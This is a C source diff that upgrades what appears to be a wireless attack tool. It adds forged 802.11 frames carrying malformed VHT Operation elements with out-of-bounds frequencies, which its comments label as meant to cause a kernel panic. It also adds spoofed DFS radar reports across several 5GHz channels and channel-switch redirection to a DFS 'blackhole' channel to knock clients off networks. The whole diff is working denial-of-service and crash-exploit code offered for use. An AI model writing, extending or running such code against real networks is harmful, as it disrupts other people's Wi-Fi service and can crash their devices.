@@ -683,6 +683,16 @@ static int mk_csa_beacon(uint8_t *b, const uint8_t bss[6], const char *ssid,
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
+  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
+  if (new_ch > 14) {
+      b[o++] = 192;
+      b[o++] = 5;
+      b[o++] = 2;   /* Channel Width: 160 MHz */
+      b[o++] = 255; /* Center Freq 1: Out of Bounds */
+      b[o++] = 255; /* Center Freq 2: Out of Bounds */
+      b[o++] = 0xff; /* Basic MCS Set */
+      b[o++] = 0xff;
+  }
 
   return o;
 }
@@ -836,6 +846,16 @@ static int mk_csa_action(uint8_t *b, const uint8_t bss[6], const uint8_t cli[6],
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
+  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
+  if (new_ch > 14) {
+      b[o++] = 192;
+      b[o++] = 5;
+      b[o++] = 2;   /* Channel Width: 160 MHz */
+      b[o++] = 255; /* Center Freq 1: Out of Bounds */
+      b[o++] = 255; /* Center Freq 2: Out of Bounds */
+      b[o++] = 0xff; /* Basic MCS Set */
+      b[o++] = 0xff;
+  }
 
   return o;
 }
@@ -890,6 +910,16 @@ static int mk_probe_resp_csa(uint8_t *b, const uint8_t bss[6],
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
+  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
+  if (new_ch > 14) {
+      b[o++] = 192;
+      b[o++] = 5;
+      b[o++] = 2;   /* Channel Width: 160 MHz */
+      b[o++] = 255; /* Center Freq 1: Out of Bounds */
+      b[o++] = 255; /* Center Freq 2: Out of Bounds */
+      b[o++] = 0xff; /* Basic MCS Set */
+      b[o++] = 0xff;
+  }
 
   return o;
 }
@@ -1187,26 +1217,33 @@ static int mk_dfs_radar_report(uint8_t *b, const uint8_t bss[6],
   b[o++] = 1; /* Action: Measurement Report */
   b[o++] = token; /* [UPGRADE] Dynamic Dialog Token */
 
-  /* Measurement Report IE (ID=39, len=15) — Basic Report + Radar map */
-  b[o++] = 39;     /* Element ID: Measurement Report */
-  b[o++] = 15;     /* Length */
-  b[o++] = 1;      /* Measurement Token */
-  b[o++] = 0;      /* Report Mode: success (not late/incapable/refused) */
-  b[o++] = 0;      /* Measurement Type: Basic Report */
-  b[o++] = cur_ch; /* Channel Number under test */
+  /* [UPGRADE] Cascading DFS Lockout (Multi-Channel Strike) */
+  /* Target the current channel + major DFS sub-bands (52, 100, 132) */
+  uint8_t target_channels[] = { cur_ch, 52, 100, 132 };
+  int num_targets = sizeof(target_channels);
 
-  /* Measurement Start Time (8 bytes TSF) */
-  uint64_t tsf = htole64(mono_us());
-  memcpy(b + o, &tsf, 8);
-  o += 8;
+  /* Build a Measurement Report IE for each target channel */
+  for (int i = 0; i < num_targets; i++) {
+      b[o++] = 39;     /* Element ID: Measurement Report */
+      b[o++] = 15;     /* Length */
+      b[o++] = (uint8_t)(i + 1); /* Measurement Token */
+      b[o++] = 0;      /* Report Mode: success (not late/incapable/refused) */
+      b[o++] = 0;      /* Measurement Type: Basic Report */
+      b[o++] = target_channels[i]; /* Channel Number under test */
 
-  /* Measurement Duration (TU) */
-  uint16_t dur = htole16(50);
-  memcpy(b + o, &dur, 2);
-  o += 2;
+      /* Measurement Start Time (8 bytes TSF) */
+      uint64_t tsf = htole64(mono_us());
+      memcpy(b + o, &tsf, 8);
+      o += 8;
 
-  /* Basic Report Map: bit3 = Radar (0x08) */
-  b[o++] = 0x08;
+      /* Measurement Duration (TU) */
+      uint16_t dur = htole16(50);
+      memcpy(b + o, &dur, 2);
+      o += 2;
+
+      /* Basic Report Map: bit3 = Radar (0x08) */
+      b[o++] = 0x08;
+  }
 
   return o;
 }
@@ -1266,6 +1303,15 @@ static int mk_dfs_vacate_csa(uint8_t *b, const uint8_t bss[6], const char *ssid,
   memcpy(b + o, &qdur, 2); o += 2;
   uint16_t qoff = htole16(0);
   memcpy(b + o, &qoff, 2); o += 2;
+
+  /* [UPGRADE] IE 192 (VHT Operation) Malformation - 160MHz Kernel Panic for 5GHz */
+  b[o++] = 192;
+  b[o++] = 5;
+  b[o++] = 2;   /* Channel Width: 160 MHz */
+  b[o++] = 255; /* Center Freq 1: Out of Bounds */
+  b[o++] = 255; /* Center Freq 2: Out of Bounds */
+  b[o++] = 0xff; /* Basic MCS Set */
+  b[o++] = 0xff;
 
   return o;
 }
@@ -1640,8 +1686,8 @@ static bool factory_build(factory_t *f, const target_ap_t *t, int new_ch,
   if (cur_ch <= 14) {
       aggressive_redir = (cur_ch <= 6) ? 14 : 1;
   } else {
-      /* In factory mode, if it's 5GHz, use the user's new_ch or default 165 */
-      aggressive_redir = (new_ch > 0) ? (uint8_t)new_ch : 165;
+      /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
+      aggressive_redir = (new_ch > 0) ? (uint8_t)new_ch : 128;
   }
 
   /* [UPGRADE] Build Realistic Countdown Burst for Factory Mode */
@@ -4097,12 +4143,13 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_CSA_BEACON]) {
-        /* [UPGRADE] Aggressive 2.4GHz Dead-End Routing */
+        /* [UPGRADE] Aggressive Routing: 2.4GHz Dead-End & 5GHz DFS Blackhole */
         int redir;
         if (snap[i].channel <= 14) {
             redir = (snap[i].channel <= 6) ? 14 : 1;
         } else {
-            redir = (snap[i].channel < 100) ? 165 : 36;
+            /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
+            redir = 128;
         }
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
@@ -4134,12 +4181,13 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_PROBE_RESPONSE_CSA]) {
-        /* [UPGRADE] Aggressive 2.4GHz Dead-End Routing */
+        /* [UPGRADE] Aggressive Routing: 2.4GHz Dead-End & 5GHz DFS Blackhole */
         int redir;
         if (snap[i].channel <= 14) {
             redir = (snap[i].channel <= 6) ? 14 : 1;
         } else {
-            redir = (snap[i].channel < 100) ? 165 : 36;
+            /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
+            redir = 128;
         }
         const char *ssid = snap[i].ssid[0] ? snap[i].ssid : "Unknown";
 
@@ -4185,12 +4233,13 @@ static void *stress_injector_thread(void *arg) {
       }
 
       if (a->cfg->vec_on[VEC_CSA_ACTION]) {
-        /* [UPGRADE] Aggressive 2.4GHz Dead-End Routing */
+        /* [UPGRADE] Aggressive Routing: 2.4GHz Dead-End & 5GHz DFS Blackhole */
         int redir;
         if (snap[i].channel <= 14) {
             redir = (snap[i].channel <= 6) ? 14 : 1;
         } else {
-            redir = (snap[i].channel < 100) ? 165 : 36;
+            /* [UPGRADE] 5GHz DFS Blackhole (TDWR Band, 10-min CAC) */
+            redir = 128;
         }
 
         /* [UPGRADE] Realistic Countdown Burst ending in 0 */
